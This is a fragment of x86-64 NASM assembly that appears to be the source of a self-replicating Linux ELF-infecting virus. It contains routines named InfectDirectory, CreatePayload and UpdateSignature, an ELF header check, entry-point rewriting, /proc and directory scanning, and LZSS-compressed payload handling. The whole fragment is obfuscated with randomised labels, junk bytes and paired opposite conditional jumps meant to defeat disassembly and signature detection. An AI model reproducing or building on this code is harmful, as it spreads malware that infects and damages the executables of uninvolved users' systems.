..@gC6RsNZRLLGA:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0x2a, 0x1a, 0x9c
    jmp         $+5
db 0x43, 0xfd, 0xae
    js          ..@3ltyKXThPRKz
    jns         ..@3ltyKXThPRKz
..@t5DXKKEr72Ce:
    pop         r1
    jmp         $+4
db 0xd7, 0x25
    js          ..@jCXSLsGeuq1T
    jns         ..@jCXSLsGeuq1T
..@PP3uQQmp0bib:
    jmp         ..@D8W8e4haqHW2
    jmp         $+4
db 0xb2, 0xf0
    jmp         $+5
db 0xc5, 0x9c, 0x4a
    jmp         $+3
db 0x51
    jb          ..@d7GvsyAHLogR
    jae         ..@d7GvsyAHLogR
..@nt2lJMjHgS0J:
    pop         r1
    jmp         $+3
db 0x8a
    jmp         $+5
db 0xb5, 0xbe, 0xa8
    jb          ..@0zyAKeuvjNXu
    jae         ..@0zyAKeuvjNXu
..@J7bTRvkcGqyh:
    cmp         BYTE [r5], DT_REG
    jmp         $+4
db 0x80, 0x7b
    jmp         $+4
db 0x7f, 0xa3
    jmp         ..@XBZzWf5okgHA
..@BhKj0QjWzwUk:
    cmp         rax, 0xffffffffffffffff
    je          ..@0eKxYmhd8wzK
    jl          ..@4OHOCu3LDT6m
    jge         ..@4OHOCu3LDT6m
..@gl2kHgEFrlFw:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jmp         $+3
db 0xe0
    jmp         ..@o7PWL7QzqQj7
..@Qei8xRzRGjOX:
    add         rax, bytes
    jmp         $+5
db 0x82, 0x47, 0x37
    jl          ..@YMyLYBCFl8eO
    jge         ..@YMyLYBCFl8eO
..@PcBahJ4OTBTt:
    cmp         BYTE [r1], '/'
    jne         ..@D8W8e4haqHW2
    cmp         DWORD [r1+1], "home"
    jmp         $+4
db 0xab, 0xfe
    jb          ..@JS86aVtqkknj
    jae         ..@JS86aVtqkknj
..@AYsVGWgDmeA7:
    jmp         ..@91u99dgMgMtA
    jmp         $+4
db 0xae, 0xe1
    jb          ..@AsnIjs2YTYSd
    jae         ..@AsnIjs2YTYSd
..@xYtIeE7XxXSy:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jnz         ..@OGFSlbAS5O53
    jmp         ..@VeHdr6sDa8P3
..@eIbzLHb1XxwN:
    add         rsp, _PAYLOAD_OFF_size
    jmp         $+4
db 0x2c, 0xe5
    js          ..@RgjbLOh0hIx0
    jns         ..@RgjbLOh0hIx0
..@t6iLf1uqK7fl:
    jl          ..@EMN8AcMIGzf6
    jmp         $+4
db 0x9e, 0x47
    jl          ..@nc43UaZocMBo
    jge         ..@nc43UaZocMBo
..@jaLz35u8xuBV:
    jmp         ..@qbVFHOrRPJJB
    jl          ..@6BQtE1pc1e3n
    jge         ..@6BQtE1pc1e3n
..@hMQ6P7aEgXSE:
    pop         r4
    pop         r5
    jmp         ..@3W7qpd8Z83xD
..@IEz5rXmXLd2w:
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    jmp         ..@0tE5rJesnqyf
..@Xx9OqydlkFAG:
    cmp         r3, 0x00
    jmp         ..@COLmzSsXPUxN
..@IovDJcYkiKjs:
    mov         rax, SYS_GETCWD
    jl          ..@UrmxHqyTnEEr
    jge         ..@UrmxHqyTnEEr
..@3ltyKXThPRKz:
    call        Strcpy
    jl          ..@3o7rqEBWQHvI
    jge         ..@3o7rqEBWQHvI
..@yJjjdY1hCKgj:
    mov         rbx, 0x1000
    sub         rbx, r3
    add         rax, rbx
    jb          ..@d7VcD6z4c3YZ
    jae         ..@d7VcD6z4c3YZ
..@ddpSo9ehycNJ:
    sub         rsp, _INFFILE_OFF_size
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+3
db 0xda
    jl          ..@MQX9vkR8JWLk
    jge         ..@MQX9vkR8JWLk
..@F76KGCx60c52:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         $+4
db 0x21, 0xdd
    jmp         ..@KfARbzWo7a7L
..@89EGBFuhqpaz:
    add         r1, 2
    mov         ax, WORD [r1]
    jmp         ..@o96WbnU0ObGp
..@JS86aVtqkknj:
    jne         ..@D8W8e4haqHW2
    jmp         $+5
db 0x46, 0xe1, 0xdc
    jmp         $+3
db 0x7a
    jmp         ..@lmU0fQG42Peh
..@fI31wiUR2vQB:
    mov         eax, 0x0
    js          ..@NEIDoPxJmWgb
    jns         ..@NEIDoPxJmWgb
..@ZoHcsh2KkIm8:
    mov         r1, r5
    jmp         $+4
db 0xd6, 0xf5
    jl          ..@sQaeTbC3PUdF
    jge         ..@sQaeTbC3PUdF
..@BdoninL6gN3e:
%ifdef X86_32
    int         0x80
%endif
    js          ..@XEAqlIbdDYx2
    jns         ..@XEAqlIbdDYx2
..@xMhCcsobBUFw:
    push        r2
    push        r3
    call        GetNewProgramVaddr
    jl          ..@ngRROfQSqPd6
    jge         ..@ngRROfQSqPd6
..@VrusKxXcFUIU:
    jl          ..@ygeGKtxnlrf5
    jl          ..@hT1GVIfGWhnH
    jge         ..@hT1GVIfGWhnH
..@vHbf07EvFTmx:
    call        FileValidation
    cmp         rax, 0x02
    jmp         $+3
db 0x5f
    jmp         ..@4u15ZC2xp2bv
..@zGyxNXjfAr7j:
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    jmp         $+5
db 0xbc, 0xd4, 0x8c
    js          ..@rbYwCfFzhhkM
    jns         ..@rbYwCfFzhhkM
..@pjjqNEI3U5x3:
    je          ..@WEitd0rgpwXf
    cmp         WORD [r1], '..'
    jmp         ..@4ImuwKZoSqjy
..@7esXEuQ13G9Y:
    mov         m6, rax
    mov         r1, rax
    jmp         $+5
db 0x62, 0x1b, 0xd4
    jmp         $+4
db 0xd3, 0x80
    jb          ..@yPd4QS887Bhv
    jae         ..@yPd4QS887Bhv
..@ejGVuZm0dijq:
    xor         rax, rax
    xor         rdx, rdx
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jmp         $+5
db 0x73, 0x3b, 0x5b
    jmp         $+4
db 0xbf, 0xc7
    jmp         ..@e8RGltXNanrV
..@ppoEfRSNxVQ2:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    mov         r4, 0
    jmp         ..@OA4GnDEuKlNB
..@qbVFHOrRPJJB:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jl          ..@LGqj53jvcE8t
    jge         ..@LGqj53jvcE8t
..@rSn65WBVQJ4n:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+3
db 0x3a
    je          ..@MrvJPtpif7uS
    jne         ..@MrvJPtpif7uS
..@L8SI4Q0hvnB2:
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    mov         QWORD [rdi], rsi
    xor         rax, rax
    jmp         $+5
db 0x12, 0x26, 0x77
    jmp         ..@vJwcwzdTK3fe
..@MEgy9b2de9UC:
    pop         r1
    jmp         $+4
db 0xea, 0x70
    jmp         ..@UrMW0DvKSbJb
..@rRSLDS476WgU:
    xor         rax, rax
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    jmp         $+3
db 0x1e
    jl          ..@0BZ07R9KLmUE
    jge         ..@0BZ07R9KLmUE
..@gIl3vLnEKxNh:
    add         r3, r5
    mov         r4, r3
    sub         r4, QWORD [r1+e_h.e_entry]
    je          ..@kc23spL8CZgp
    jne         ..@kc23spL8CZgp
..@KfARbzWo7a7L:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    je          ..@zGyxNXjfAr7j
    jne         ..@zGyxNXjfAr7j
..@3lv7ajh46FZs:
    add         r4, 1
    jb          ..@r89U95L6j7fN
    jae         ..@r89U95L6j7fN
..@mIYzDwdoZw2p:
    cmp         BYTE [r5], DT_DIR
    jb          ..@KCVnV1mIHIHU
    jae         ..@KCVnV1mIHIHU
..@O3CU49gn6YuI:
    push        r2
    push        r1
    mov         r5, QWORD [r1+file.fileptr]
    jmp         $+4
db 0xd5, 0x5f
    jl          ..@TBAjs7NheG9i
    jge         ..@TBAjs7NheG9i
..@K4mPBaLgRhAP:
    cmp         eax, 0x00
    js          ..@t6iLf1uqK7fl
    jns         ..@t6iLf1uqK7fl
..@rd81QEQtzY9K:
    mov         r1, [rsp+_NBF_OFF.file]
    jmp         ..@t0AXUPUk3vkx
CreatePayload:
    jmp         ..@Eg3N1gAUSoVg
..@wnYJSQWfltnv:
    ret
    jmp         $+5
db 0x12, 0xb2, 0x07
    jmp         $+3
db 0x09
    jmp         InfectDirectory
..@K1QZ17h52KKl:
    push        r5
    jb          ..@kYcTOF0Cud0Z
    jae         ..@kYcTOF0Cud0Z
..@NykW4msVQ0bt:
    xor         rax, rax
    js          ..@djHLpTKCP5jT
    jns         ..@djHLpTKCP5jT
..@w6QAZ6bG7g9O:
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         ..@wk0gXiJhPpl7
..@O2rTnA0gScMQ:
    cmp         rax, 0x01
    je          ..@n9WAUeeZGNXi
    je          ..@jaLz35u8xuBV
    jne         ..@jaLz35u8xuBV
..@GOGYdNSmFy4c:
    and         r5, (PAGE_SIZE-1)
    jmp         $+3
db 0xd6
    jmp         $+4
db 0xbc, 0x7f
    jl          ..@gIl3vLnEKxNh
    jge         ..@gIl3vLnEKxNh
..@OA4GnDEuKlNB:
    call        UpdateSignature
    mov         r1, m6
    jmp         $+3
db 0xc7
    jmp         ..@6mhpmUPZIDnv
..@5IO4xegQ1k0N:
    cmp         DWORD [r1], 0x464c457f
    jne         ..@jA95S8yFo8Np
    cmp         BYTE [r1+4], ELFCLASS
    jmp         ..@Z2mvgtsjU0Os
..@Aus1rQLUvW0P:
    or          bx, ax
    jmp         $+3
db 0x49
    jb          ..@IPFTykcEmBz2
    jae         ..@IPFTykcEmBz2
..@FKu04PA3nPvo:
    syscall
    test        al, al
    jnz         ..@WZCYAhM44Jz9
    jmp         $+3
db 0x4e
    jl          ..@73aRoLv90i11
    jge         ..@73aRoLv90i11
..@wocwCFdsvg2l:
    test        rax, rax
    jmp         $+3
db 0x5f
    jb          ..@F0tC96kkB440
    jae         ..@F0tC96kkB440
..@CJiDUK4I2AlZ:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jl          ..@ZiIJKTQUJBn2
    jmp         $+3
db 0x54
    jmp         ..@HlXQas9lBrwe
..@c6MMp94YvWYa:
    mov         r1, r5
    mov         r3, _signature.startsize
    call_vsp    Strncmp
    jmp         $+4
db 0x7e, 0x1d
    jmp         $+4
db 0x94, 0x67
    jmp         $+3
db 0xe3
    je          ..@wocwCFdsvg2l
    jne         ..@wocwCFdsvg2l
..@kY435vm4sd90:
    mov         r1, m6
    jmp         $+4
db 0x28, 0x33
    jmp         ..@99ZUsLPYj2nb

_eof:

